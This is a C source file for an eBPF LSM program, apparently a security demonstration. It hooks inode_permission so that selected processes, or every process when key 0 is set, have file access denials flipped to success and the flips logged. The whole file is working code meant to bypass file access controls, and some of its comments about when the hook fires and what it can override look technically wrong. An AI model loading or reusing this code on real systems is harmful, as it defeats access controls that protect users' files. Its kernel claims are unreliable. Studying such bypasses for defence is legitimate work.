// ch01 Mirror Controls — REAL mutation via BPF LSM fmod_ret.
//
// Hooks lsm/inode_permission (called on vfs_read / vfs_write) and flips
// -EACCES to 0 for targeted tgids. This hook fires reliably on kernel
// 6.14+ where security_capable bypasses the LSM chain for non-root
// processes.
//
// Demonstrates: BPF LSM can override file access denials at the VFS
// level, granting read/write to files the process would otherwise be
// blocked from.
#include "vmlinux.h"
#include <bpf/bpf_helpers.h>
#include <bpf/bpf_tracing.h>
#include <bpf/bpf_core_read.h>

char LICENSE[] SEC("license") = "GPL";

struct evt {
    unsigned int pid, tgid;
    char comm[16];
    int hook;       // 1=file_permission
    int orig_ret;
    int flipped;
    int mask;       // MAY_READ=4, MAY_WRITE=2
    char fname[32];
};

struct {
    __uint(type, BPF_MAP_TYPE_RINGBUF);
    __uint(max_entries, 1 << 18);
} events SEC(".maps");

struct {
    __uint(type, BPF_MAP_TYPE_HASH);
    __type(key, unsigned int);
    __type(value, unsigned int);
    __uint(max_entries, 1024);
} target_tgids SEC(".maps");

static __always_inline int is_target(void)
{
    unsigned int tgid = bpf_get_current_pid_tgid() >> 32;
    unsigned int *hit = bpf_map_lookup_elem(&target_tgids, &tgid);
    unsigned int zero = 0;
    return (hit || bpf_map_lookup_elem(&target_tgids, &zero)) ? 1 : 0;
}

// int security_inode_permission(struct inode *inode, int mask)
// fmod_ret: return 0 to allow, -EACCES to deny.
// This is the key LSM hook called by do_inode_permission() — fires
// BEFORE the DAC check returns, and BPF's return overrides.
SEC("lsm/inode_permission")
int BPF_PROG(lsm_inode_permission, struct inode *inode, int mask, int ret)
{
    if (!is_target())
        return ret;

    // Skip root (uid 0) — flipping root denials breaks system services.
    // Only flip for non-root targeted processes.
    unsigned long long uid_gid = bpf_get_current_uid_gid();
    unsigned int uid = uid_gid & 0xffffffff;
    if (uid == 0)
        return ret;

    int flipped = 0;
    int new_ret = ret;
    if (ret != 0) {
        new_ret = 0;  // flip denial to allow
        flipped = 1;
    }

    // Only emit events on actual flips to avoid flooding the ringbuf
    // (inode_permission fires thousands of times per second).
    if (flipped) {
        struct evt *e = bpf_ringbuf_reserve(&events, sizeof(*e), 0);
        if (e) {
            unsigned long id = bpf_get_current_pid_tgid();
            e->pid = id & 0xffffffff;
            e->tgid = id >> 32;
            bpf_get_current_comm(&e->comm, sizeof(e->comm));
            e->hook = 1;
            e->orig_ret = ret;
            e->flipped = flipped;
            e->mask = mask;
            struct hlist_node *first = BPF_CORE_READ(inode, i_dentry.first);
            if (first) {
                struct dentry *dent = (struct dentry *)((char *)first -
                    __builtin_offsetof(struct dentry, d_u.d_alias));
                const unsigned char *name = BPF_CORE_READ(dent, d_name.name);
                if (name)
                    bpf_probe_read_kernel_str(&e->fname, sizeof(e->fname), name);
            }
            bpf_ringbuf_submit(e, 0);
        }
    }
    return new_ret;
}
